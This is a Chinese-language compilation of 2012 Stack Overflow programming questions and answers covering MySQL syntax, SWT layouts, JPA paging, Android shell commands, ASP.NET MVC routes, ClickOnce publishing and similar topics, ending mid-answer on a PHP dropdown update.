> 时间：2012-09-06T12:37:16.187
> 
> 标签：php, mysql, sql, phpmyadmin

我在 sql server managementmengt studio 上有以下查询，但它似乎不适用于 phpmyadmin，任何人都可以找出问题所在，它给出了此错误消息“#1064 - 您的 SQL 语法有错误；请查看手册对应于您的 MySQL 服务器版本，以便在第 7 行的 '1 google_rank FROM eig_ranking mi WHERE mi.project_id = m.project_' 附近使用正确的语法

我正在使用 MySQL 版本：5.5.20 和 php 版本 5.3.13 和 microsoft server 2008

```
 SELECT project_id,

   google_rank,

       COALESCE(
       (
       SELECT TOP 1 google_rank
       FROM eig_ranking mi
       WHERE mi.project_id = m.project_id
       ORDER BY
             project_id
       ), 0 - google_rank AS movement

       ,keyword
       ,domain

FROM  eig_ranking m where DATEDIFF(WEEK,rank_date, GETDATE())= 1 and google_rank!=0

order by movement desc 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:39:47.667

如果您的数据库是 MySQL，那么您需要编写 MySQL 语法而不是 Microsoft SQL Server 语法 - 替换`TOP`为`LIMIT`，以及`DATEDIFF`MySQL 格式的参数，`GETDATE()`with`NOW()`等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:41:19.773

MySQL 上没有`SELECT TOP n`表达式。

一般来说，SQL Server 的语法与 MySQL 的语法略有不同。您必须将 SQL 语法细节调整为 MySQL（例如 this `TOP`）。

# java - ExpandBar 无法与 GridLayout 一起使用

> ID：12300298
> 
> 赞同：3
> 
> 时间：2012-09-06T12:37:20.447
> 
> 标签：java, swt, layout-manager, ubuntu-12.04, grid-layout

我正在用 Java 和 SWT 创建一个应用程序，但我遇到了问题。我想将 ExpandBar 放入 GridLayout。一切都很好，而我没有折叠展开栏。当我这样做时，它会正常折叠，但不会重新布局复合材料。下面的屏幕应该解释我的问题：

崩溃前：
![崩溃前](../Images/a435730caae6c0c7a0606f821ecdcf49.png)
崩溃后：
![崩溃后](../Images/12b5adc0f40f15d57a671f874e74b99e.png)

我尝试了一些技巧，例如：

```
bar.addExpandListener(new ExpandListener() {
    public void itemExpanded(ExpandEvent e) {
        item0.setHeight(composite.computeSize(SWT.DEFAULT, SWT.DEFAULT).y);
        gridData2.heightHint = composite.computeSize(SWT.DEFAULT,
                SWT.DEFAULT).y;
        comp.layout(true, true);
    }

    public void itemCollapsed(ExpandEvent e) {
        item0.setHeight(item0.getHeaderHeight());
        gridData2.heightHint = item0.getHeaderHeight();
        comp.layout(true, true);
    }
}); 
```

尽管它不起作用。这是SSCCE：

```
package stackoverflow;

import org.eclipse.jface.window.Window;
import org.eclipse.swt.SWT;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.Button;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.swt.widgets.Control;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.ExpandBar;
import org.eclipse.swt.widgets.ExpandItem;
import org.eclipse.swt.widgets.Shell;
import org.eclipse.swt.widgets.Tree;

public class MainWindowSWT extends Window {

    public MainWindowSWT() {
        super((Shell)null);

        setBlockOnOpen(true);
        open();
        Display.getCurrent().dispose();
    }

    @Override
    protected Control createContents(Composite parent) {
        final Composite comp = new Composite(getShell(), 0);

        GridLayout layout = new GridLayout(1, true);
        comp.setLayout(layout);

        Tree tree = new Tree(comp, SWT.BORDER | SWT.H_SCROLL | SWT.V_SCROLL);
        GridData gridData = new GridData();
        gridData.verticalAlignment = GridData.FILL;
        gridData.verticalSpan = 2;
        gridData.grabExcessVerticalSpace = true;
        gridData.horizontalAlignment = GridData.FILL;
        gridData.grabExcessHorizontalSpace = true;
        tree.setLayoutData(gridData);

        final ExpandBar bar = new ExpandBar(comp, SWT.V_SCROLL);
        final Composite composite = new Composite(bar, SWT.NONE);
        GridLayout gridLayout = new GridLayout();
        gridLayout.verticalSpacing = 10;
        composite.setLayout(gridLayout);
        Button button = new Button(composite, SWT.PUSH);
        button.setText("SWT.PUSH");
        final ExpandItem item0 = new ExpandItem(bar, SWT.NONE, 0);
        item0.setText("Test");
        item0.setHeight(composite.computeSize(SWT.DEFAULT, SWT.DEFAULT).y);
        item0.setControl(composite);

        item0.setExpanded(true);

        final GridData gridData2 = new GridData();
        gridData2.horizontalAlignment = GridData.FILL;
        gridData2.grabExcessHorizontalSpace = true;
        bar.setLayoutData(gridData2);

        return parent;
    }
} 
```

Ubuntu 12.04.1 amd64，SWT 3.7.2。

提前致谢。

// 顺便说一句：我不想调整外壳的大小。我想调整展开栏上方的树的大小。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:08:00.753

好的，所以我找到了一个有点 hacky 的解决方案，但它有效：

```
public class MainWindowSWT {

    public static void main(String[] args) {
        final Display display = new Display();
        final Shell shell = new Shell(display);
        shell.setLayout(new FillLayout());
        shell.setText("ExpandBar Example");
        final ExpandBar bar = new ExpandBar(shell, SWT.NONE);

        final Composite composite = new Composite(bar, SWT.NONE);
        GridLayout layout = new GridLayout();
        composite.setLayout(layout);
        Button button = new Button(composite, SWT.PUSH);
        button.setText("SWT.PUSH");
        ExpandItem item0 = new ExpandItem(bar, SWT.NONE, 0);
        item0.setText("What is your favorite button");
        item0.setHeight(composite.computeSize(SWT.DEFAULT, SWT.DEFAULT).y);
        item0.setControl(composite);

        item0.setExpanded(true);

        bar.setSpacing(8);

        bar.addExpandListener(new ExpandListener() {

            @Override
            public void itemExpanded(ExpandEvent e) {
                if (e.item instanceof ExpandItem) {
                    ExpandItem item = (ExpandItem) e.item;
                    shell.setSize(shell.getSize().x, shell.getSize().y + item.getHeight());
                }
            }

            @Override
            public void itemCollapsed(ExpandEvent e) {
                if (e.item instanceof ExpandItem) {
                    ExpandItem item = (ExpandItem) e.item;
                    shell.setSize(shell.getSize().x, shell.getSize().y - item.getHeight());
                }
            }
        });
        shell.pack();
        shell.open();
        while (!shell.isDisposed()) {
            if (!display.readAndDispatch()) {
                display.sleep();
            }
        }
        display.dispose();
    }
} 
```

基本上，您强制`shell`增加/减少其高度以反映变化。我希望有一个更简单/更漂亮的方法，但现在我想不出任何东西。

它部分基于[这个](https://stackoverflow.com/a/7633840)答案，但没有使用线程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-19T12:30:36.037

我得到它的工作，但我对这个解决方案不满意......

```
bar.addExpandListener(new ExpandAdapter() {

    @Override
    public void itemCollapsed(ExpandEvent e) {
        new Thread(new Runnable() {

            @Override
            public void run() {
                try {
                    synchronized (this) {
                        wait(250);
                    }
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                Display.getDefault().asyncExec(new Runnable() {
                    public void run() {
                        layout();

                    }
                });
            }
        }).start();
    }

    @Override
    public void itemExpanded(ExpandEvent e) {
        new Thread(new Runnable() {

            @Override
            public void run() {
                try {
                    synchronized (this) {
                        wait(250);
                    }
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                Display.getDefault().asyncExec(new Runnable() {
                    public void run() {
                        layout();

                    }
                });
            }
        }).start();
    }
}); 
```

# browser - 如何从浏览器插件中捕获 Flash 流 url

> ID：12300299
> 
> 赞同：0
> 
> 时间：2012-09-06T12:37:22.060
> 
> 标签：browser, firefox-addon, flash, npapi

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T14:03:22.310

NPAPI 插件通常要求浏览器为它们加载数据，它们自己不会这样做。这意味着浏览器扩展可以拦截这些请求。例如，这可以通过实施[内容策略](https://developer.mozilla.org/en-US/docs/XUL_School/Intercepting_Page_Loads#Content_Policy)来完成。插件发起的请求将导致`shouldLoad`类型为 的调用`OBJECT_SUBREQUEST`。

更简单的选择是使用[HTTP 观察](https://developer.mozilla.org/en-US/docs/XUL_School/Intercepting_Page_Loads#HTTP_Observers)器- 但这样您将无法识别由 Flash 发起的请求，它们看起来就像浏览器处理的任何其他请求一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T14:03:30.580

Firebug 就是这样做的，而且它是开源的。为什么不研究一下呢？

[https://github.com/firebug/](https://github.com/firebug/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-02-05T07:21:45.210

如果您只想从单个网站中的单个 swf 获取 url，这很容易。例如，如果您只需要来自该 swf 的 url，您可以只打开一个浏览器实例并使用工具拦截其 http 请求。

# java - 批处理中的逻辑错误？

> ID：12300302
> 
> 赞同：0
> 
> 时间：2012-09-06T12:37:42.537
> 
> 标签：java, loops, jpa, batch-file

无论如何，我通常为自己调试我的东西，我也有一个替代（臃肿但有效）的解决方案，但我似乎无法在我的以下批处理代码中找出逻辑错误：

```
private int records = 0;
private Query q;

public void BatchProcessor(String className)
        throws Exception {
    int pageSize = 1000;
    boolean done = false;
    List<Test> resultList = null;

    while (!done) {

        q.setFirstResult(records);
        q.setMaxResults(records+pageSize);
        System.out.println("records: "+records);            

        if (records % pageSize == 0) {
            em.clear();
        }

        resultList = q.getResultList();
        process(resultList);
    }
}

private void process(List<Test> list) {
    Iterator<Test> itAmount = list.iterator();
    while (itAmount.hasNext()) {
        Test dto = itAmount.next();
        records=records+1;
    }
} 
```

输出如下：

记录：0
记录：1000
记录：3000
记录：7000
记录：15000
记录：31000
...

这真让我抓狂。while() 中的每个循环似乎再次从“0”开始，因为 q.setFirstResult() 的数量然后列表变大。该列表每次迭代都会变大，直到发生“内存不足”异常。我也不明白为什么它没有打印出 20000 条记录、40000 条、50000 条等。我完全看不出这段代码中的错误 :( 请问有人有提示吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:39:37.993

你不应该这样做`q.setMaxResults(records+pageSize)`；你应该只做`q.setMaxResults(pageSize)`；

如果随着你的`records`增加你正在增加`MaxResults`

Java 文档

> 查询 setMaxResults(int maxResult)
> 
> 设置要检索的最大结果数。

由于您的`records+pageSize`价值，该列表正在增加

```
records= 0 MaxResults = 1000;
records= 1000 MaxResults = 2000; 
```

它应该总是像

```
records= 0 MaxResults = 1000;
records= 1000 MaxResults = 1000;
records= 2000 MaxResults = 1000; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:45:18.847

done 永远不会设置为 true，因此它会永远循环。

然后将记录设置为 0，然后设置为 1000，然后设置为 3000，然后设置为 7000，...

所以你的输出也很正常......

```
private int records = 0;
private Query q;

public void BatchProcessor(String className)
        throws Exception {
    int pageSize = 1000;
    int nbofloops = 0;
    boolean done = false;
    List<Test> resultList = null;

    while (!done) {

        q.setFirstResult(pageSize * nbofloops++;);
        q.setMaxResults(pageSize);
        System.out.println("records: "+records);            

        if (records % pageSize == 0) {
            em.clear();
        }

        resultList = q.getResultList();
        process(resultList);
    }
}

private void process(List<Test> list) {
    Iterator<Test> itAmount = list.iterator();
    while (itAmount.hasNext()) {
        Test dto = itAmount.next();
        records=records+1;
    }
} 
```

# web-services - 重复任务中的 Axis2 存根对象

> ID：12300306
> 
> 赞同：2
> 
> 时间：2012-09-06T12:37:49.240
> 
> 标签：web-services, axis2, webservices-client

我正在使用轴 2 与第三方 Web 服务进行通信。此 Web 服务将在每 1 分钟的计时器中调用一次，并且计时器将运行几天。

现在我的问题是我们是否需要在每次进行 web 服务调用时创建存根对象，或者我们是否可以在类级别变量（计时器对象）中维护存根对象并始终使用同一个对象。

轴故障异常是否会对存根进行任何更改。我的意思是当轴故障异常（如超时，服务器停机）发生时，我们是否需要创建一个新的存根实例？

仅 stub.cleanup 就足够了吗？还是我们也需要调用传输清理？

# 我的代码

```
try {
  stub = new PartnerAPIStub(configurationContext, endPointRef);

   ... service call code

 }
 catch(Exception ex)
 {
      stub.cleanup();
     stub = new PartnerAPIStub(configurationContext, endPointRef);
 } 
```

# c++ - 读取 .vtk 文件

> ID：12300310
> 
> 赞同：1
> 
> 时间：2012-09-06T12:38:44.477
> 
> 标签：c++, qt, ubuntu-10.04, vtk

我正在努力`VTK (Qt on ubuntu 10.04)`。
我正在尝试读取`.vtk`具有 3D 图像的文件。据我了解，这

[http://www.vtk.org/Wiki/VTK/Examples/Cxx/IO/GenericDataObjectReader](http://www.vtk.org/Wiki/VTK/Examples/Cxx/IO/GenericDataObjectReader)

可以读取任何 vtk 文件。但是，它不起作用。我得到的是：

```
Starting /home/taha/Downloads/VTK/Examples/qtcreator-build/GenericDataObjectReader...
Usage: /home/taha/Downloads/VTK/Examples/qtcreator-build/GenericDataObjectReader InputFilename
/home/taha/Downloads/VTK/Examples/qtcreator-build/GenericDataObjectReader exited with code 1 
```

1）我使用的代码是否正常工作？我应该改变什么吗？

即使我知道我需要将文件名作为参数传递，但我可能不知道如何从命令提示符处执行此操作。我在互联网上对此进行了详细搜索，但我遵循的方式可能是错误的。

2) 如何将文件名作为参数传递给 C++ 程序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T14:00:55.193

如果您想从 vtk-wiki 给出的示例中调用已编译的程序，只需打开一个 shell/dos 窗口并输入：

```
yourExecutable.exe path-to-file.vtk 
```

如上面所述的输出，您不符合运行示例的要求（2 个参数）。

一个参数（第一个）是用法（对您调用的程序），第二个参数包含您要读取的 vtk 文件的路径。

如果您不想使用参数调用它，可以将给定的示例更改为：

```
int main ( int argc, char *argv[] )
{

  // simply set filename here (oh static joy)
  std::string inputFilename = "setYourPathToVtkFileHere";

  // Get all data from the file
  vtkSmartPointer<vtkGenericDataObjectReader> reader = 
      vtkSmartPointer<vtkGenericDataObjectReader>::New();
  reader->SetFileName(inputFilename.c_str());
  reader->Update();

  // All of the standard data types can be checked and obtained like this:
  if(reader->IsFilePolyData())
    {
    std::cout << "output is a polydata" << std::endl;
    vtkPolyData* output = reader->GetPolyDataOutput();
    std::cout << "output has " << output->GetNumberOfPoints() << " points." << std::endl;
    }

  return EXIT_SUCCESS;
} 
```

并简单地将*setYourPathToVtkFileHere*替换为（最好是绝对的）您的路径。

# qwidget - 子 QWidget 未正确绘制

> ID：12300311
> 
> 赞同：2
> 
> 时间：2012-09-06T12:38:48.150
> 
> 标签：qwidget, qwebview, qt4.8

当用户在网页中选择输入文本字段时，我需要显示一个虚拟键盘。此代码在机顶盒上运行。

我正在扩展 QWebView，它正在创建一个新的键盘小部件作为孩子。

```
WebView::WebView(QWidget* parent = 0): QWebView(parent)
{
    WebPage *page = new WebPage(this);
    this->m_keyboard = new widgetKeyBoard(this, Qt::Window|Qt::CustomizeWindowHint);
    this->m_keyboard->createKeyboard();
    this->m_keyboard->hide();
    connect(this, SIGNAL(launchVirtualKB(WebView *) ), SLOT(launchKeyboard(WebView *)));
} 
```

widgetKeyBoard 由带有许多子 QKeyPushButton 的 QGridLayout 组成。

当我展示键盘时，我看到整个键盘被简单地绘制，然后从下面的网页覆盖了 30% 的键盘（在输入字段附近被覆盖）。我试图为 webview 和 mainwindow 重新绘制，但仍然看到其他人正在覆盖。

什么可能导致这样的问题。我正在使用 QT4.8。

# frameworks - play 2.0中难掌握的scala模板

> ID：12300314
> 
> 赞同：0
> 
> 时间：2012-09-06T12:38:53.500
> 
> 标签：frameworks, playframework-2.0

我之前使用过 play 1.2.4，发现与 play 2.0 中的 scala 模板相比，groovy 模板要容易得多。我已经阅读了 play 2.0 的文档。看来我应该对scala有一些初步了解。请帮助我或建议我一些教程来掌握 scala 模板的良好知识，以便我可以玩 play 2.0 ....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-20T21:00:05.550

从像[这样的初学者教程开始](http://www.playframework.org/documentation/1.0/firstapp)

playframework[网站模板部分](http://www.playframework.org/documentation/2.0.3/JavaTemplates)是下一个很好的探索部分。你不会在那里找到你需要的一切，但它有模板的细节。您可能还想了解 Scala 语法的基础知识，[这](http://jim-mcbeath.blogspot.ca/2008/09/scala-syntax-primer.html)是一个很好的教程

从那里你应该有基础，如果你遇到更多的障碍，我相信你可以通过反复试验或通过提出更具体的问题来解决它们

祝你好运

# c# - 如果子字符串在一个单词中，则获取该单词之前的索引值

> ID：12300315
> 
> 赞同：2
> 
> 时间：2012-09-06T12:38:53.617
> 
> 标签：c#, string, asp.net-mvc-2

在某个计数之后，我用`.Substring(0, 100)`. 我不想在单词中间打断，如果是这样的话，我想进入单词之前的第一个空格。

我想我检查下一个字符是否不在`" "`单词中间。我最大的问题是如何退后一步来获取`" "`（空白）的索引。

这就是我到目前为止所得到的

```
 string description = "a long string";            

        description = Regex.Replace(description, @"(?></?\w+)(?>(?:[^>'""]+|'[^']*'|""[^""]*"")*)>", String.Empty);
        var newString = (description.Count() > 101) ? description.Substring(0, 101) : description;

        //i tried something like this
        var whatIsNext = newString.IndexOf(" ", 100, -20); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:42:01.693

我想你正在寻找 [`String.LastIndexOf`](http://msdn.microsoft.com/en-us/library/1tw91fa3.aspx)：

> 报告此实例中指定 Unicode 字符最后一次出现的从零开始的索引位置。搜索从指定的字符位置开始，然后向后向字符串的开头进行。

你想要这样的东西：

```
int index = s.LastIndexOf(' ', 100); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:43:45.260

使用 LastIndexOf 并将其应用于您的子字符串

```
// The string we are searching.
string value = "Dot Net Perls";
//
// Find the last occurrence of ' '.
int index1 = value.LastIndexOf(' '); 
```

链接[信息](http://www.dotnetperls.com/lastindexof)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T12:42:52.863

`var whatIsNext = newString.Substring(0, newString.LastIndexOf(' '));`

# c# - 实体框架代码优先、DTO 和 n 层方案 (WCF)

> ID：12300320
> 
> 赞同：1
> 
> 时间：2012-09-06T12:39:20.193
> 
> 标签：c#, wcf, entity-framework, ef-code-first, n-tier-architecture

我已经阅读了几篇关于一堆 EF 和 DTO 的文章，我需要一些关于在 WCF 的 n 层场景中使用 EF Code First 和 DTO 的说明。

让我们看一下这些类：

```
public class Order
{
  public int Id { get; set; }
  public DateTime ShipDate { get; set; }
  public ObservableCollection<OrderDetail> Details { get; private set; }  
}

public class OrderDetail
{
  public int Id { get; set; }
  public int OrderId { get; set; }
  public int ProductId { get; set; }
  public decimal Quantity { get; set; }
} 
```

当用户想要编辑现有订单时，我的客户端应用程序（WPF MVVM 应用程序）请求一些 DTO，然后将其转换为`Order`实例。然后，用户通过 UI 按顺序进行一些更改 - 例如，更改`ShipDate`、删除两个位置、修改一个和添加一个。

现在我想将更改交付给服务器。据我了解 DTO 概念，我需要构造一些 DTO 类型，其中包含有关更改的信息：

```
[DataContract]
public class UpdateOrderDTO
{
  [DataMember]
  public DateTime ShipDate { get; set; }
  [DataMember]
  public Collection<OrderDetail> NewDetails { get; private set; }
  [DataMember]
  public Collection<OrderDetail> ModifiedDetails { get; private set; }
  [DataMember]
  public Collection<OrderDetail> DeletedDetails { get; private set; }
} 
```

但是我应该**在什么时候**、在哪里创建这个 DTO？我的意思是，我无法在提交更改时创建它——`Order`课堂上没有更改跟踪信息。

`Order`看起来，这个对象必须在用户请求编辑后一起创建。这允许跟踪更改...我错了吗？

请注意，问题与 STE 无关。由于某些原因，我不想/不能在当前项目中使用它们。

非常感谢您分享您的经验。

# scala - Scala 是否优化此代码？

> ID：12300329
> 
> 赞同：1
> 
> 时间：2012-09-06T12:39:55.550
> 
> 标签：scala

在下面的代码中，我将对象放在哪里`query`（循环内或循环外）是否重要？为了可读性，我更喜欢这个第一个版本：

```
class MyClass {
  db withSession {
    names.foreach { name =>
      val query = MyEntity.createFinderBy(_.name)  <----------
      query.list(text).foreach(res =>
        doSomething
      }
    }
  }
} 
```

但是这个第二版不是更好吗？

```
class MyClass {
  db withSession {
    val query = MyEntity.createFinderBy(_.name)  <----------
    names.foreach { name =>
      query.list(text).foreach(res =>
        doSomething
      }
    }
  }
} 
```

甚至？

```
class MyClass {
  val query = MyEntity.createFinderBy(_.name)  <----------
  db withSession {
    names.foreach { name =>
      query.list(text).foreach(res =>
        doSomething
      }
    }
  }
} 
```

在Java中，我会将它放在类顶部的静态最终字段中......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:59:16.310

不，它没有，因为在第一个示例中，您明确告诉它为每个元素调用`createFinderBy`（以及）。`list`无法保证这些方法每次都会返回相同的值（即*引用透明*），因此无法记忆这些值或针对第二个或第三个示例优化代码。

如果您可以这样注释方法，或者如果编译器可以解决它，那将是一个很好的功能，但目前它没有。

顺便说一句，您可以更改该`createFinderBy`方法，使其将值存储在`mutable.Map`缓存中并使用该`getOrElseUpdate`方法返回值，如果您的查询已经在地图中，则该方法返回一个缓存值，否则计算查询并缓存它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:59:41.563

scalac 不（不能）优化您的代码，因为它不使用效果系统。这使得 scalac 几乎不可能关心优化是否会破坏代码。例如，如果`MyEntity.createFinderBy(_.name)`不是纯的（也许它会增加一个计数访问次数的计数器），如果它执行一次或在每次迭代中执行，它将进行更改。

在这种情况下，我可以建议更改函数文字的位置：

```
scala> 1 to 3 foreach {x => println("x"); println(x)}
x
1
x
2
x
3

scala> 1 to 3 foreach {println("x"); x => println(x)}
x
1
2
3 
```

在第二个示例中，创建了一个返回传递给 foreach 的函数的块（在执行其他表达式之后），而在前一个示例中，整个块是一个函数。

# android - 如何以编程方式在android中执行linux命令？

> ID：12300335
> 
> 赞同：1
> 
> 时间：2012-09-06T12:40:18.590
> 
> 标签：android, shell, android-ndk, linux-kernel

与在命令行中的 android（通过 android sdk/tools 文件夹）一样，我们同样可以执行 linux shell 命令来访问 mnt 文件夹/data 文件夹。（例如cd data ls）现在我想在android中以编程方式执行该命令，那怎么可能呢？

* * *

我正在使用以下代码执行 shell 命令

```
Process p = Runtime.getRuntime().exec("cd data"); 
```

但它给了我例外

```
java.io.IOException: Error running exec(). Command: [cd, data] Working 
Directory:  null Environment: null 
```

* * *

那么我应该如何进行呢。在此先感谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-06T12:54:31.260

`cd`不是 Linux 命令，它是内置于 shell 中的命令；*它会在该 shell 进程的上下文中*更改当前工作目录。在您的情况下，如果该命令成功，则仅对子进程（它将很快终止）成功，并且对您自己的进程没有影响。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:54:18.393

尝试这个 ：

```
Process p = Runtime.getRuntime().exec("cd /data"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-09T15:27:09.833

在 Android 上，您的进程无权读取其他应用程序中的文件`/data/data/_other-package-name_`，或在目录中列出其私有文件`/data/data/_other-package-name_/files`。但它确实有权限列出和读取 lib 目录中的文件，如果*其他包*以公共方式打开此文件`/data/data/_other-package-name_/lib`，您可以查看 中的特定文件。`/data/data/_other-package-name_/files`

 *即，如果*other-package*执行以下操作：

```
FileOutputStream fos = openFileOutput("public_file", Context.MODE_WORLD_READABLE);
fos.write("hello world".getBytes());
fos.close(); 
```

那么你的包可以像这样读取这个文件：

```
byte[] bytes = new byte[100];
FileInputStream fis = new FileInputStream(new File("/data/data/*other-package*/files/public_file"));
int cnt = fis.read(bytes);
fis.close();
Log.d("Two_Libs", new String(bytes, 0, cnt)); 
```

但是您不能列出该目录中的公共文件来发现它们。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T14:25:49.947

要检索应用程序私有数据文件夹的路径，请使用 Java 中的以下命令：

```
File MyData = Ctxt.getDir("Foo"); 
```

其中 Ctxt 是一个 Context 对象，就像一个 Activity。它会为您返回一条路径，例如`/data/data/com.activity.networkRequestDetector/app_Foo`. 请注意，`/data/data/com.activity.networkRequestDetector/`在 Android 中不鼓励读/写 - 它是您应用程序的沙箱的根，不能用来玩。

要从数据文件夹打开文件，请使用以下内容：

```
FileInputStream Stm = new FileInputStream(new File(MyData, "Filename.txt")); 
```

通常，您的应用程序也可以执行 shell 命令执行的任何操作。Shell 命令只是像其他人一样使用 API 的程序。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-05-05T10:13:05.347

使用如下： -

```
 Process process = Runtime.getRuntime().exec("command to be executed");
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream())); 
```*

# c# - 如何使用 MVC4 将路由操作作为参数传递给 Index 方法

> ID：12300341
> 
> 赞同：0
> 
> 时间：2012-09-06T12:40:32.867
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, routes

我有以下路线，其中任何以 A、F 或 L 开头的 URL 都指向索引操作。看起来像是使用了一个 C 锐利的正则表达式。

```
 context.MapRoute(
            "content",
            "{page}/{title}",
            new { controller = "Server", action = "Index" },
            new { page = @"^[AFL][0-9A-Z]{3}$" }
        ); 
```

我想做类似的事情，但这次将任何具有菜单、目标、页面或主题操作的 URL 引导到索引操作并传递“菜单”、“目标”、“页面”或“主题”将 Index 操作作为参数：

有人可以告诉我如何做到这一点。它看起来像一种 C# 正则表达式，但我不确定如何执行第二条路线所需的表达式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:34:53.103

您只需要一个简单的路由约束：

```
 context.MapRoute(
        "content",
        "{page}/{title}",
        new { controller = "Server", action = "Index" },
        new { page = @"Menus|Objectives|Pages|Topics" }
    ); 
```

然后您的操作方法签名将如下所示：

```
public ActionResult Index(string page)
{
    ...
    return View();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:15:22.827

看这里的例子......

[http://www.asp.net/mvc/tutorials/controllers-and-routing/creating-a-route-constraint-cs](http://www.asp.net/mvc/tutorials/controllers-and-routing/creating-a-route-constraint-cs) 你已经定义了一个带有参数的路由。

```
routes.MapRoute(
    "Content",
    "Content/{TypeOfAction}",
    new {controller="Content", action="Index"},
    new {@"\b(Menus|Objectives|Pages|Topics)\b"}

); 
```

假设您有一个带有 Index 操作的 ContentController，它将 TypeOfAction 作为参数处理

编辑了答案： `\b`在正则表达式中找到单词边界...尚未对其进行测试，但应该可以工作... [http://www.regular-expressions.info/wordboundaries.html](http://www.regular-expressions.info/wordboundaries.html) http://www.regular-expressions.info/交替.html

# visual-studio - 如何让 Visual Studio 将特定文件复制到发布目录？

> ID：12300348
> 
> 赞同：2
> 
> 时间：2012-09-06T12:40:55.323
> 
> 标签：visual-studio, deployment, clickonce, publish

我正在使用`Publish`Visual Studio 的功能为我的 VSTO 加载项创建 ClickOnce 设置文件。

我知道我可以通过将它们的 Build Action 设置为`Content`. 假设我有一个名为 的文件`readme.txt`，其 Build Action 设置为`Content`. 这就是发生的事情：

```
publish
+-- setup.exe
+-- MyAddIn.vsto
+-- ApplicationFiles
    +-- ...lots of files..
    +-- readme.txt.deploy     <-- 
```

由于该文件包含我希望用户在安装应用程序*之前*阅读的信息，这就是我*想要*发生的事情：

```
publish
+-- setup.exe
+-- MyAddIn.vsto
+-- readme.txt                 <--
+-- ApplicationFiles
    +-- ...lots of files.. 
```

有没有简单的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2019-01-18T21:02:01.750

在项目文件的底部：

```
<Target Name="AfterPublish">
    <Exec Command="xcopy.exe /Y &quot;$(TargetDir)readme.txt&quot; &quot;$(PublishUrl)&quot;" />
</Target> 
```

如果这个更一般的场景对其他人有用，这是我正在做的工作：

```
<PropertyGroup>
    <ReadmeFilesDir>README-files</ReadmeFilesDir>
</PropertyGroup>

<Target Name="AfterPublish">
    <Exec Command="xcopy.exe /Y &quot;$(TargetDir)README.html&quot; &quot;$(PublishUrl)&quot;" />
    <Exec Command="xcopy.exe /E /I /Y &quot;$(TargetDir)$(ReadmeFilesDir)&quot; &quot;$(PublishUrl)$(ReadmeFilesDir)&quot;" />
</Target> 
```

^(^(*我想知道是否有回答一个六岁问题的徽章。*))

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-06T12:49:43.777

也许您可以使用构建后命令将文件移动到您想要的位置，然后向导将按原样打包文件夹。

# php - 选择下拉菜单时可以运行数据库更新功能

> ID：12300358
> 
> 赞同：0
> 
> 时间：2012-09-06T12:41:29.833
> 
> 标签：php, html, forms

我想知道从下拉列表中选择项目时是否可以运行更新查询。用户做出选择，然后调用一个函数来更新数据库中的特定字段。这将使用一个选择框来存储选项来实现。谢谢。

```
 echo '<td>';
    echo '<select name="order_status[]" onChange = "update()">';
    echo '<option value = "1" class ="pending">Pending</option>';
    echo '<option value = "2" class = "approved">Approved</option>';
    echo '<option value = "3" class ="disapproved">Disapproved</option>';
    echo '</select>';
    echo '</td>';
    echo '</tr>'; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:43:59.197

是的，这是可能的。如果您希望查询无缝运行（即，无需按下提交按钮并刷新页面），那么您将需要使用 Ajax 将请求异步发送到您的 PHP 脚本。

编辑：最简单的事情就是在您的活动中使用 jQuery 的`$.get()`功能。`onchange`这样，每次有人选择一个选项时，jQuery 都会使用该选项的值将请求发送到您的 PHP 脚本。PHP 脚本将运行，并将新数据返回给您的 jQuery，然后它会使用其 DOM 功能将该数据插入到您的页面中。

你可以用一个按钮做同样的事情。只需坚持`$.get()`按钮的`onclick`事件而不是选择元素的`onchange`事件。

jQuery 站点的文档将为您提供相关的代码示例。

编辑2：好的，这是一个非常固定的例子。

首先，让我们考虑一下您希望在后端发生的实际过程。用最简单的术语来说，您希望从用户输入中获取一个 id 并使用它在查询中运行。非常简单（使用 PDO 进行数据库工作）：

```
// in a real app, you'd need to sanitize and validate the incoming id
$id = $_GET['id'];

$stmt = $dbh->prepare("SELECT * FROM table_name WHERE id = :id");
$stmt->bindParam(":id", $id);
$stmt->execute();

$row = $stmt->fetch(PDO::FETCH_ASSOC);

echo json_encode($row); // makes it jQuery friendly 
```

好的，所以后端非常简单。现在，对于字体末端，魔法发生的地方。为了将 id 传回 PHP 脚本，然后处理结果，这是我使用`select`元素和 a的方法：`button`

```
